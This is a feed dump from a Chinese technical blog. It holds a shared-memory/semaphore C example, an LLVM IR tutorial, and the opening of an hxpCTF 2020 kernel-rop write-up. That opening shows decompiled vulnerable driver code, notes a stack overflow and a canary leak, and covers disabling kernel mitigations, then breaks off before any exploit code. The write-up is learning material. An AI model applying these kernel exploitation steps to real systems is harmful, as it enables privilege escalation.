failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.init ok\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 等待信信号挂出，等待成功后，将持有锁。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.<span class="built_in">wait</span>() == <span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.wait failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.wait ok\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 申请一个共享内存并将shmptr指过去</span></span><br><span class="line">   <span class="type">int</span> shmid = <span class="built_in">shm_attach</span>();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Proc2 contents is %s\n&quot;</span>, shmptr);</span><br><span class="line">   <span class="built_in">memset</span>(shmptr, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 挂出信号灯，释放锁。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.<span class="built_in">post</span>() == <span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.post failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.post ok\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//detach shared memory</span></span><br><span class="line">   <span class="built_in">shmdt</span>(shmptr);</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 销毁信号灯。</span></span><br><span class="line">   <span class="comment">// if (sem.destroy()==false) &#123; printf(&quot;sem.destroy failed.\n&quot;); return -1; &#125;</span></span><br><span class="line">   <span class="comment">// printf(&quot;sem.destroy ok\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>client 先初始化信号量，然后获取资源，申请到共享内存，写入’A’，释放资源</li><li>server 连上这个信号量，连上这个 shm，打印出 client 写入的’A’，获取资源，写入’B’</li><li>client 释放资源之后再看内存，已经变成’B’的形状了</li></ul><p><img src="/2022/10/18/shared-memory-and-semaphore-machenism/2.png" alt="2"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#分类&quot;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;管道&lt;/li&gt;
&lt;li&gt;消息队列&lt;/li&gt;
&lt;li&gt;信号&lt;/li&gt;
&lt;li&gt;共享内存&lt;/li&gt;
&lt;li&gt;信号量&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="C" scheme="https://squirre17.github.io/categories/C/"/>
    
    
    <category term="Linux" scheme="https://squirre17.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>llvm-init</title>
    <link href="https://squirre17.github.io/2022/10/18/llvm-init/"/>
    <id>https://squirre17.github.io/2022/10/18/llvm-init/</id>
    <published>2022-10-18T02:27:10.000Z</published>
    <updated>2022-10-18T02:35:32.980Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lld-12</span><br><span class="line">sudo ln -s /lib/llvm-9/bin/llc /bin/llc</span><br><span class="line">sudo ln -s /lib/llvm-9/bin/opt /bin/opt</span><br></pre></td></tr></table></figure><p>官方文档：<a href="https://llvm.org/docs/LangRef.html">LLVM Language Reference Manual — LLVM 16.0.0git documentation</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -Xclang -ast-dump -fsyntax-only test.c</span><br></pre></td></tr></table></figure><p>生成 AST</p><ul><li>-S                      Only run preprocess and compilation steps</li><li>-emit-llvm         Use the LLVM representation for assembler and object files</li><li>-c                      Only run preprocess, compile, and assemble steps （生成字节码的 bc 文件）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -S -emit-llvm test.c </span><br></pre></td></tr></table></figure><p>生成的 ir 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define dso_local i32 @main() #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">1</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">1</span>, align <span class="number">4</span></span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果开启优化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -S -emit-llvm -O3 test.c</span><br></pre></td></tr></table></figure><p>会直接变成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define dso_local i32 @main() local_unnamed_addr #<span class="number">0</span> &#123;</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后用 llc 生成汇编</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc test.ll</span><br></pre></td></tr></table></figure><p>ll 到 bc 文件可以用 llvm-as<br> 反过来用 llvm-dis<br> 注意，ll 和 bc 和内存中的形式是等价的。</p><p><code>dso_local</code>  是一个 Runtime Preemption 说明符，表明该函数会在同一个链接单元（即该函数所在的文件以及包含的头文件）内解析符号。</p><p>对于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> first, <span class="type">int</span> second)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> first + second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> foo(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成</p><ul><li>alloca 就是在栈中分配空间</li><li>先把传入的值放入栈中再拿出来（嫩麻烦</li><li>nsw : no signed wrap</li><li>所有的全局变量都以 @ 为前缀</li><li>这里 <code>#0</code>  与之后的 <code>attributes #0</code>  相对应</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;main.c&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;main.c&quot;</span></span><br><span class="line">target datalayout = <span class="string">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line">target triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@a = dso_local global i32 <span class="number">5</span>, align <span class="number">4</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @foo(i32, i32) #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">3</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">4</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  store i32 %<span class="number">0</span>, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  store i32 %<span class="number">1</span>, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">5</span> = load i32, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">6</span> = load i32, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">7</span> = add nsw i32 %<span class="number">5</span>, %<span class="number">6</span></span><br><span class="line">  ret i32 %<span class="number">7</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @main() #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">1</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">2</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">1</span>, align <span class="number">4</span></span><br><span class="line">  store i32 <span class="number">4</span>, i32* %<span class="number">2</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">3</span> = load i32, i32* @a, align <span class="number">4</span></span><br><span class="line">  %<span class="number">4</span> = load i32, i32* %<span class="number">2</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">5</span> = call i32 @foo(i32 %<span class="number">3</span>, i32 %<span class="number">4</span>)</span><br><span class="line">  ret i32 %<span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;clang version 9.0.1-12 &quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于库外函数 要使用就需要 declare 这个函数的签名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare i32 @getint()</span><br></pre></td></tr></table></figure><h2 id="条件分支"><a class="markdownIt-Anchor" href="#条件分支">#</a> 条件分支</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = getint();</span><br><span class="line">    <span class="type">int</span> b = getint();</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (a == b) &#123;</span><br><span class="line">        c = <span class="number">5</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        c = <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    putint(c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">define dso_local i32 @main() #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">1</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">2</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">3</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">4</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">1</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">5</span> = call i32 (...) @getint()</span><br><span class="line">  store i32 %<span class="number">5</span>, i32* %<span class="number">2</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">6</span> = call i32 (...) @getint()</span><br><span class="line">  store i32 %<span class="number">6</span>, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">7</span> = load i32, i32* %<span class="number">2</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">8</span> = load i32, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">9</span> = icmp eq i32 %<span class="number">7</span>, %<span class="number">8</span></span><br><span class="line">  br i1 %<span class="number">9</span>, label %<span class="number">10</span>, label %<span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>:                                               ; preds = %<span class="number">0</span></span><br><span class="line">  store i32 <span class="number">5</span>, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  br label %<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>:                                               ; preds = %<span class="number">0</span></span><br><span class="line">  store i32 <span class="number">10</span>, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  br label %<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>:                                               ; preds = %<span class="number">11</span>, %<span class="number">10</span></span><br><span class="line">  %<span class="number">13</span> = load i32, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">14</span> = call i32 (i32, ...) bitcast (i32 (...)* @putint to i32 (i32, ...)*)(i32 %<span class="number">13</span>)</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>语法 <code>br + 标志位 + truelabel + falselabel</code></p><h1 id="cfg图"><a class="markdownIt-Anchor" href="#cfg图">#</a> cfg 图</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> max(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>opt -dot-cfg test.ll</code>  生成</p><p>为了可视化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y graphviz-doc libgraphviz-dev graphviz</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dot .max.dot  -Tpng -o max.png</span><br></pre></td></tr></table></figure><p><img src="/2022/10/18/llvm-init/image-20221018103046162.png" alt="image-20221018103046162"><br> 如果在 clang 的时候用 O3 编译<br>这里就变成了选择函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define dso_local i32 @max(i32, i32) local_unnamed_addr #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">3</span> = icmp sgt i32 %<span class="number">0</span>, %<span class="number">1</span></span><br><span class="line">  %<span class="number">4</span> = select i1 %<span class="number">3</span>, i32 %<span class="number">0</span>, i32 %<span class="number">1</span></span><br><span class="line">  ret i32 %<span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>sgt: signed greater than (<a href="https://releases.llvm.org/2.7/docs/LangRef.html">LLVM Assembly Language Reference Manual</a>)</li><li>The ‘select’ instruction is used to choose one value based on a condition, without branching.</li></ul><h1 id="ssa-phi-node"><a class="markdownIt-Anchor" href="#ssa-phi-node">#</a> SSA &amp; phi node</h1><p>这个概念在 ghidra，南大静态分析，各种文章里都看过了。。<br>SSA form enables and simplifies a vast number of compiler optimizations, and is the de-facto standard for intermediate representations in compilers of imperative programming languages.<br> 看这个就行 <a href="https://carstein.github.io/2020/10/22/ssa-explained.html">SSA Explained</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">define i32 @max(i32 %a, i32 %b) &#123;</span><br><span class="line">entry:</span><br><span class="line">  %<span class="number">0</span> = icmp sgt i32 %a, %b</span><br><span class="line">  br i1 %<span class="number">0</span>, label %btrue, label %bfalse</span><br><span class="line"></span><br><span class="line">btrue:                                      ; preds = %<span class="number">2</span></span><br><span class="line">  br label %end</span><br><span class="line"></span><br><span class="line">bfalse:                                     ; preds = %<span class="number">2</span></span><br><span class="line">  br label %end</span><br><span class="line"></span><br><span class="line">end:                                     ; preds = %btrue, %bfalse</span><br><span class="line">  %retval = phi i32 [%a, %btrue], [%b, %bfalse]</span><br><span class="line">  ret i32 %retval</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依据控制流分支选择变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc -O0 -filetype=asm test.ll</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># %bb<span class="number">.0</span>:                                # %entry</span><br><span class="line">cmpl%esi, %edi</span><br><span class="line">movl%edi, <span class="number">-4</span>(%rsp)          # <span class="number">4</span>-byte Spill</span><br><span class="line">movl%esi, <span class="number">-8</span>(%rsp)          # <span class="number">4</span>-byte Spill</span><br><span class="line">jle.LBB0_2</span><br><span class="line"># %bb<span class="number">.1</span>:                                # %btrue</span><br><span class="line">movl<span class="number">-4</span>(%rsp), %eax          # <span class="number">4</span>-byte Reload</span><br><span class="line">movl%eax, <span class="number">-12</span>(%rsp)         # <span class="number">4</span>-byte Spill</span><br><span class="line">jmp.LBB0_3</span><br><span class="line">.LBB0_2:                                # %bfalse</span><br><span class="line">movl<span class="number">-8</span>(%rsp), %eax          # <span class="number">4</span>-byte Reload</span><br><span class="line">movl%eax, <span class="number">-12</span>(%rsp)         # <span class="number">4</span>-byte Spill</span><br><span class="line">jmp.LBB0_3</span><br><span class="line">.LBB0_3:                                # %end</span><br><span class="line">movl<span class="number">-12</span>(%rsp), %eax         # <span class="number">4</span>-byte Reload</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>汇编里是实现就是每一条分支都往 <code>-12(%rsp)</code>  上放置数据，然后 end 分支读取。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
      
    
    
    
    <category term="Static Analysis" scheme="https://squirre17.github.io/categories/Static-Analysis/"/>
    
    
    <category term="llvm" scheme="https://squirre17.github.io/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>hexp-2020-kernel-rop</title>
    <link href="https://squirre17.github.io/2022/09/29/hexp-2020-kernel-rop/"/>
    <id>https://squirre17.github.io/2022/09/29/hexp-2020-kernel-rop/</id>
    <published>2022-09-29T14:53:15.000Z</published>
    <updated>2022-10-18T02:37:30.029Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://2020.ctf.link/">Challenges</a><br>hxpCTF 2020 kernel-rop<br> 已经同步到 gittee</p><p>先读取出 init 的文件系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunzip initramfs.cpio.gz</span><br><span class="line">mv vmlinuz vmlinux</span><br></pre></td></tr></table></figure><p>设置 inittab 中 sh 权限为 root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuidgid 0000 sh</span><br></pre></td></tr></table></figure><h1 id="hackmeso"><a class="markdownIt-Anchor" href="#hackmeso">#</a> <a href="http://hackme.so">hackme.so</a></h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">hackme_write</span><span class="params">(file *f, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> size, <span class="type">loff_t</span> *off)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> size_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> tmp[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  size_1 = v4;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">4096LL</span>, v4);</span><br><span class="line">    BUG();</span><br><span class="line">  &#125;</span><br><span class="line">  _check_object_size(hackme_buf, v4, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(hackme_buf, data, size_1) )              [<span class="number">1</span>] &lt;&lt;- 用户cp数据到 hackme_buf</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  _memcpy(tmp, hackme_buf);                                    [<span class="number">2</span>] &lt;&lt;- 溢出tmp</span><br><span class="line">   <span class="keyword">return</span> size_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看 read</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">hackme_read</span><span class="params">(file *f, <span class="type">char</span> *data, <span class="type">size_t</span> size, <span class="type">loff_t</span> *off)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> tmp[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  size_1 = v4;</span><br><span class="line">  v9 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _memcpy(hackme_buf, tmp);                    [<span class="number">1</span>] &lt;&lt;- 注意 tmp下面就是canary 可以泄漏</span><br><span class="line">  <span class="keyword">if</span> ( size_1 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">4096LL</span>, size_1);</span><br><span class="line">    BUG();</span><br><span class="line">  &#125;</span><br><span class="line">  _check_object_size(hackme_buf, size_1, <span class="number">1LL</span>);</span><br><span class="line">  v6 = copy_to_user(data, hackme_buf, size_1) == <span class="number">0</span>;</span><br><span class="line">  result = <span class="number">-14LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    <span class="keyword">return</span> size_1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="无smep-smap-kpti-kaslr"><a class="markdownIt-Anchor" href="#无smep-smap-kpti-kaslr">#</a> 无 SMEP SMAP KPTI KASLR</h1><p>removing  <code>+smep</code> ,  <code>+smap</code> ,  <code>kpti=1</code> ,  <code>kaslr</code>  and adding  <code>nopti</code> ,  <code>nokaslr</code> .</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 